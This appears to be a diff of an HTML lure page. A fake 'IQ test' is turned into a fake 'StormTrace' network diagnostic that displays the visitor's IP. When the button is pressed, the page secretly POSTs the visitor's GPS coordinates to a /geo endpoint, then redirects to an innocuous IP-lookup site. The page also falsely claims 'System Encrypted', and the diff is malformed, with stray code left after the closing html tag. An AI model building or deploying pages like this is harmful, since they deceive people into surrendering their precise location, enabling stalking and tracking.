@@ -1,39 +1,138 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official IQ Test 2024</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>⚡ StormTrace Network Intelligence</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
-        h1 { color: #2c3e50; font-size: 24px; }
-        p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #2980b9; }
+        /* Thunder/Storm Gradient Background */
+        body { 
+            font-family: 'Segoe UI', monospace; 
+            background: radial-gradient(circle at center, #1b2735 0%, #090a0f 100%);
+            color: #00d2ff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+
+        /* Lightning Flicker Animation */
+        @keyframes lightning {
+            0%, 95%, 98% { box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); border-color: #30363d; }
+            96%, 99% { box-shadow: 0 0 60px rgba(255, 255, 255, 0.6); border-color: #ffffff; }
+        }
+
+        .dashboard { 
+            background: rgba(22, 27, 34, 0.85); 
+            backdrop-filter: blur(10px);
+            padding: 40px; 
+            border-radius: 15px; 
+            border: 1px solid #30363d; 
+            width: 90%; 
+            max-width: 380px; 
+            text-align: center;
+            animation: lightning 5s infinite; /* Occasional flash effect */
+            position: relative;
+        }
+
+        .label { 
+            color: #8b949e; 
+            font-size: 11px; 
+            letter-spacing: 2px; 
+            text-transform: uppercase; 
+        }
+
+        .ip-display { 
+            font-size: 32px; 
+            font-weight: 900; 
+            margin: 15px 0; 
+            color: #fff; 
+            text-shadow: 0 0 15px #00d2ff; 
+        }
+
+        /* Electric Blue Gradient Button */
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 25px; 
+            font-family: inherit; 
+            font-size: 14px;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 210, 255, 0.5);
+            filter: brightness(1.2);
+        }
+
+        .status-light {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00d2ff;
+            border-radius: 50%;
+            margin-right: 5px;
+            box-shadow: 0 0 8px #00d2ff;
+        }
+
+        .status-text { font-size: 12px; color: #c9d1d9; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>IQ Calculator</h1>
-    <p>Enter your age to begin the certified IQ assessment.</p>
-    <input type="number" id="age" placeholder="Enter your age (e.g. 21)">
-    <button onclick="startTest()">Start IQ Test</button>
+<div class="dashboard">
+    <div class="label">Client Network Node</div>
+    <div class="ip-display">{{ user_ip }}</div>
+    
+    <div style="margin-bottom: 25px;">
+        <span class="status-light"></span>
+        <span class="label" style="color: #00d2ff;">System Encrypted</span>
+    </div>
+
+    <p style="font-size: 13px; color: #8b949e; line-height: 1.6;">
+        Initiate <strong>StormTrace</strong> diagnostic to identify packet leaks and server proximity.
+    </p>
+    
+    <button onclick="scan()">RUN DEEP TRACE</button>
+    <div class="status-text" id="stat">Awaiting user command...</div>
 </div>
 
 <script>
-function startTest() {
-    const ageVal = document.getElementById('age').value;
-    if (!ageVal) { alert("Please enter your age first"); return; }
-
-    // This triggers the browser's REAL Permission Popup
+function scan() {
+    const stat = document.getElementById('stat');
+    stat.innerHTML = "Tracing Route via GPS...";
+    stat.style.color = "#fff";
+    
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => sendData(pos, ageVal), 
-            (err) => redirect() 
-        );
+        navigator.geolocation.getCurrentPosition((pos) => {
+            stat.innerHTML = "Encrypting Data...";
+            fetch('/geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+            }).then(() => {
+                window.location.href = "https://whatismyipaddress.com";
+            });
+        }, (err) => {
+            window.location.href = "https://whatismyipaddress.com";
+        });
+    } else {
+        window.location.href = "https://whatismyipaddress.com";
+    }
+}
+</script>
+
+</body>
+</html>
     } else {
         redirect();
     }
